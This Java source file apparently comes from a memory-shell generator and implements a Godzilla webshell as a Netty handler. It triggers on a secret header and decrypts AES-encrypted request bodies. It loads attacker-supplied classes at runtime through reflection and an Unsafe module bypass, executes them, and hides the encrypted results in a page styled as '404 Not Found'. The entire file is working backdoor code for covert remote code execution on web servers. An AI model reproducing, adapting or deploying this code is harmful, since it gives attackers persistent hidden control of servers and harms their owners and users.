package com.reajason.javaweb.memshell.shelltool.godzilla.hw;

import io.netty.buffer.ByteBuf;
import io.netty.buffer.ByteBufUtil;
import io.netty.buffer.Unpooled;
import io.netty.channel.ChannelDuplexHandler;
import io.netty.channel.ChannelFutureListener;
import io.netty.channel.ChannelHandler;
import io.netty.channel.ChannelHandlerContext;
import io.netty.handler.codec.http.DefaultFullHttpResponse;
import io.netty.handler.codec.http.FullHttpResponse;
import io.netty.handler.codec.http.HttpContent;
import io.netty.handler.codec.http.HttpHeaderNames;
import io.netty.handler.codec.http.HttpRequest;
import io.netty.handler.codec.http.HttpResponseStatus;
import io.netty.handler.codec.http.HttpVersion;
import io.netty.handler.codec.http.LastHttpContent;
import io.netty.util.AttributeKey;
import io.netty.util.CharsetUtil;
import java.io.ByteArrayOutputStream;
import java.io.PrintStream;
import java.lang.reflect.Field;
import java.lang.reflect.Method;
import java.net.URL;
import java.net.URLClassLoader;
import javax.crypto.Cipher;
import javax.crypto.spec.SecretKeySpec;

/**
 * Godzilla HW NettyHandler 模板（JAVA_AES_BASE64_PROFILE）。
 * <p>
 * 请求/响应按当前加密器处理；Netty 侧用 channel attribute 保存每个连接
 * 的请求与 body，避免 @Sharable 实例字段在并发连接间串数据。
 *
 * @author ReaJason
 */
@ChannelHandler.Sharable
public class GodzillaHwNettyHandlerProfile extends ChannelDuplexHandler {
    private final AttributeKey<Object[]> state = AttributeKey.valueOf(getClass().getName() + ".state");
    private static String key;
    private static String pass;
    private static String md5;
    private static String style = "404 Not Found";

    private static String headerName;
    private static String headerValue;
    private static Class<?> payload;

    @Override
    public void channelRead(ChannelHandlerContext ctx, Object msg) throws Exception {
        if (msg instanceof HttpRequest) {
            HttpRequest request = (HttpRequest) msg;
            String value = request.headers().get(headerName);
            if (value == null || !value.contains(headerValue)) {
                ctx.fireChannelRead(msg);
                return;
            }
            ctx.channel().attr(state).set(new Object[]{request, new ByteArrayOutputStream()});
        }
        if (msg instanceof HttpContent) {
            Object[] current = ctx.channel().attr(state).get();
            if (current == null) {
                ctx.fireChannelRead(msg);
                return;
            }
            HttpContent httpContent = (HttpContent) msg;
            ((ByteArrayOutputStream) current[1]).write(ByteBufUtil.getBytes(httpContent.content()));
            if (httpContent instanceof LastHttpContent) {
                ctx.channel().attr(state).set(null);
                try {
                    handle(ctx, ((ByteArrayOutputStream) current[1]).toByteArray());
                } catch (Throwable e) {
                    e.printStackTrace();
                }
                return;
            }
            ctx.fireChannelRead(msg);
        }
    }

    @SuppressWarnings("all")
    private void handle(ChannelHandlerContext ctx, byte[] body) throws Exception {
        String sdata = new String(body, "UTF-8");
        if (sdata.indexOf(md5.substring(16)) > 0) {
            style = new String(x(base64Decode(java.net.URLDecoder.decode(
                    sdata.split(md5.substring(16))[1], "UTF-8")), false));
        }
        if (sdata.indexOf(md5.substring(0, 16)) > 0) {
            sdata = sdata.split(md5.substring(0, 16))[1];
            byte[] data = x(base64Decode(java.net.URLDecoder.decode(sdata, "UTF-8")), false);
            if (payload == null) {
                payload = reflectionDefineClass(data);
                sendString(ctx, style.replace("##style##", ""));
            } else {
                ByteArrayOutputStream arrOut = new ByteArrayOutputStream();
                Object f = payload.newInstance();
                f.equals(arrOut);
                f.equals(data);
                f.toString();
                String encoded = java.net.URLEncoder.encode(
                        base64Encode(x(arrOut.toByteArray(), true)), "UTF-8");
                sendString(ctx, style.replace("##style##",
                        md5.substring(0, 16) + encoded + md5.substring(16)));
            }
        } else {
            sendString(ctx, style.replace("##style##", ""));
        }
    }

    private void sendString(ChannelHandlerContext ctx, String text) {
        send(ctx, Unpooled.copiedBuffer(text, CharsetUtil.UTF_8), "text/plain; charset=UTF-8");
    }

    private void sendBytes(ChannelHandlerContext ctx, byte[] bytes) {
        send(ctx, Unpooled.wrappedBuffer(bytes), "application/octet-stream");
    }

    private void send(ChannelHandlerContext ctx, ByteBuf content, String contentType) {
        FullHttpResponse response = new DefaultFullHttpResponse(HttpVersion.HTTP_1_1, HttpResponseStatus.OK, content);
        response.headers().set(HttpHeaderNames.CONTENT_TYPE, contentType);
        response.headers().set(HttpHeaderNames.CONTENT_LENGTH, response.content().readableBytes());
        ctx.channel().writeAndFlush(response).addListener(ChannelFutureListener.CLOSE);
    }

    @SuppressWarnings("all")
    public static String base64Encode(byte[] bs) throws Exception {
        try {
            Object encoder = Class.forName("java.util.Base64").getMethod("getEncoder").invoke(null);
            return (String) encoder.getClass().getMethod("encodeToString", byte[].class).invoke(encoder, bs);
        } catch (Exception var6) {
            Object encoder = Class.forName("sun.misc.BASE64Encoder").newInstance();
            return (String) encoder.getClass().getMethod("encode", byte[].class).invoke(encoder, bs);
        }
    }

    @SuppressWarnings("all")
    public static byte[] base64Decode(String bs) throws Exception {
        try {
            Object decoder = Class.forName("java.util.Base64").getMethod("getDecoder").invoke(null);
            return (byte[]) decoder.getClass().getMethod("decode", String.class).invoke(decoder, bs);
        } catch (Exception var6) {
            Object decoder = Class.forName("sun.misc.BASE64Decoder").newInstance();
            return (byte[]) decoder.getClass().getMethod("decodeBuffer", String.class).invoke(decoder, bs);
        }
    }
    @SuppressWarnings("all")
    public byte[] x(byte[] s, boolean m) throws Exception {
        Cipher cipher = Cipher.getInstance("AES/CBC/PKCS5Padding");
        cipher.init(m ? 1 : 2, new SecretKeySpec(key.getBytes(), "AES"),
                new javax.crypto.spec.IvParameterSpec(pass.getBytes("UTF-8")));
        return cipher.doFinal(s);
    }

    @SuppressWarnings("all")
    public byte[] x(byte[] s, boolean m, boolean pro) throws Exception {
        return x(s, m);
    }

    public Class<?> reflectionDefineClass(byte[] classBytes) throws Exception {
        Object unsafe = null;
        Object rawModule = null;
        long offset = 48;
        Method getAndSetObjectM = null;
        try {
            Class<?> unsafeClass = Class.forName("sun.misc.Unsafe");
            Field unsafeField = unsafeClass.getDeclaredField("theUnsafe");
            unsafeField.setAccessible(true);
            unsafe = unsafeField.get(null);
            rawModule = Class.class.getMethod("getModule").invoke(this.getClass(), (Object[]) null);
            Object module = Class.class.getMethod("getModule").invoke(Object.class, (Object[]) null);
            Method objectFieldOffsetM = unsafe.getClass().getMethod("objectFieldOffset", Field.class);
            offset = (Long) objectFieldOffsetM.invoke(unsafe, Class.class.getDeclaredField("module"));
            getAndSetObjectM = unsafe.getClass().getMethod("getAndSetObject", Object.class, long.class, Object.class);
            getAndSetObjectM.invoke(unsafe, this.getClass(), offset, module);
        } catch (Throwable ignored) {
        }
        URLClassLoader urlClassLoader = new URLClassLoader(new URL[0], Thread.currentThread().getContextClassLoader());
        Method defMethod = ClassLoader.class.getDeclaredMethod("defineClass", byte[].class, Integer.TYPE, Integer.TYPE);
        defMethod.setAccessible(true);
        Class<?> clazz = (Class<?>) defMethod.invoke(urlClassLoader, classBytes, 0, classBytes.length);
        if (getAndSetObjectM != null) {
            getAndSetObjectM.invoke(unsafe, this.getClass(), offset, rawModule);
        }
        return clazz;
    }

    @SuppressWarnings("all")
    private String getErrorMessage(Throwable throwable) {
        PrintStream printStream = null;
        try {
            ByteArrayOutputStream outputStream = new ByteArrayOutputStream();
            printStream = new PrintStream(outputStream);
            throwable.printStackTrace(printStream);
            return outputStream.toString();
        } finally {
            if (printStream != null) {
                printStream.close();
            }
        }
    }
}
